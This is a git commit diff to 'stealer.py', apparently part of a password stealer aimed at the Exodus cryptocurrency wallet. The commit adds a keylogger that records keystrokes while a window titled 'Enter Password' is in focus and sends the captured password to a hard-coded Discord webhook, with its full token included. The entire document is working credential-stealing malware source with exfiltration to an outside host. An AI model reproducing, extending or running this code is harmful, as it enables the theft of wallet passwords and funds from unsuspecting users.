bc8ce31c24f40f4b8b23c38f71a4e7cc5af6deb1
NotKatsu <122122838+NotKatsu@users.noreply.github.com>
2023-05-28 12:55:37 +0100

    on_key_press function added and password is now sent to a webhook

--- stealer.py
+++ stealer.py
@@ -3,15 +3,26 @@ import keyboard
 
 from typing import Union
 from modules.tasks import Tasks
+from modules.webhook import Webhook
 from modules.current_window import Current_Window
 
 webhook_url: str = "https://discord.com/api/webhooks/1112035772191744000/Y5OR4lqKD1MWhTLhGE-HlklSunyRV65sy64mN-0ermaNkFzbrVX3zWeR99TRk7sc5AUf"
 current_string: str = ""
 
-def on_key_press(event):
-    if Current_Window.fetch_one()["title"] == "Enter Password":
-        print(f"Key Pressed: {event.name}")
+def on_key_press(event: object):
+    global current_string
 
+    if Current_Window.fetch_one()["title"] == "Enter Password":
+        if event.name == "enter":
+            current_string += "\n\n\n"
+            Webhook.send(current_string, webhook_url)
+        elif event.name == "space":
+            current_string += " "
+        elif event.name == "caps lock":
+            current_string += "[CAPS LOCK]"
+        else:
+            current_string += event.name
+            
 class Exodus_Password_Stealer:
     def __init__(self, exectuable_name: str) -> None:
         self.executable_name: str = exectuable_name
@@ -31,7 +42,6 @@ class Exodus_Password_Stealer:
         while True:
             if self.check_if_running() == True:
                 keyboard.on_release(on_key_press); keyboard.wait('enter')
-                    
                 time.sleep(0.2)
         
 if __name__ == "__main__":
